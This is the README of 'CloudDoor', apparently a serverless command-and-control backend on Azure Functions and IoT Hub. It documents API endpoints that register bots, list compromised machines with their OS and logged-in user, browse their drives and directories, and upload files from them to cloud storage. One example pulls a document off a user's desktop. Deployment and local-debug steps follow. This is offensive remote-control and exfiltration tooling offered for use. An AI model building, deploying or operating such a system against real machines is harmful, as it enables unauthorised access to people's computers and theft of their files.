# About

CloudDoor is a minimalistic serverless CnC application based on Azure Functions and Azure IoT Hub.
The application allows to register new IoT devices, perform basic queries on them and issue remote operations.

The following reporitory contains only the backend configuration and code.
[The code of an example bot can be found here.](https://github.com/kamiljano/CloudDoorClient)

# TODO

* Store the device creation date (might require parsing the IoT Hub event)
* make sure that the functions are deployed along with the template
* Figure out the authentication for everything except for the registration function
* Add automatic client version updates
* Make sure that the admin api of the IoT Hub can only be accessed from the cloud. Might need to put it into some vNet or something

# Endpoints

## Register

    PUT /api/bots

    No Body

    Example output:

    {
        "connectionString": "HostName=**********;SharedAccessKey=**************",
        "deviceId": "****************"
    }

## Search for devices

    GET /api/bots

    Example output:

    [
        {
            "id": "c12535a0-a673-4510-8bbc-c1b3bb80281f",
            "os": {
                "version": "Microsoft Windows NT 6.2.9200.0",
                "type": "Win32NT"
            },
            "currentUser": "DF\\janoka"
        }
    ]

## Issue a command

    POST /api/bots/:botId/command

### List Drives

    Request Body:

    {
        "type": "driveList"
    }

    Example Response:

    {
        "drives": [
            {
                "name": "C:\\"
            }
        ]
    }

### List Directories

    Request Body:

    {
        "type": "dirList",
        "payload": {
            "path": "C:"
        }
    }

    Example Response:

    {
        "files": [
            {
                "name": "data",
                "type": "DIR"
            },
            {
                "name": "postgresql_84.exe",
                "type": "FILE"
            }
        ]
    }

### Upload file

    Request Body:

    {
        "type": "fileUpload",
        "payload": {
            "paths": [
                "C:\\Users\\janoka\\Desktop\\exam.docx"	
            ]
        }
    }

    Example Response:

    {
        "uploads": [
            {
                "status": "UPLOADED",
                "path": "C:\\Users\\janoka\\Desktop\\speach.docx",
                "storage": {
                    "path": "uploads/2a33cc05-8186-45e2-ae47-1325cf89d66d/C:/Users/janoka/Desktop/speach.docx"
                }
            }
        ]
    }

Where `uploads.storage.path` represents the exact place in the Azure Storage account where the file is available.

# Install Dependencies

All dependencies can be installed with the simple command

```
npm install -g azure-functions-core-tools
npm install
```

# Deploy

## Production environemnt

1. Create a resource group - `az group create --name CloudDoorProdResourceGroup --location northeurope`
2. Deploy the resources - `az group deployment create --resource-group CloudDoorProdResourceGroup --template-file "./azuredeploy.json"`

## Development environment

1. Create a resource group - `az group create --name CloudDoorDevResourceGroup --location northeurope`
2. Deploy the resources - `az group deployment create --resource-group CloudDoorDevResourceGroup --template-file "./azuredeploy.json" --parameters @azuredeploy-devparameters.json`

## Common

3. Authentiation cannot be defined in the ARM template. This is why it has to be set up automatically based on [this video](https://www.youtube.com/watch?v=aMk4sieku_Y)

# Debug locally

Once all resources are deployed, you can fetch the remote settings with `func azure functionapp fetch-app-settings CloudDoorDev`.
This will pre-configure the `local.settings.json` with all the necessary data to hook your local instance to the remotely hosted IoT Hub and
all other resources that are necessary for a smooth local run.

Once you have your `local.settings.json` in place, run the local server with `func start`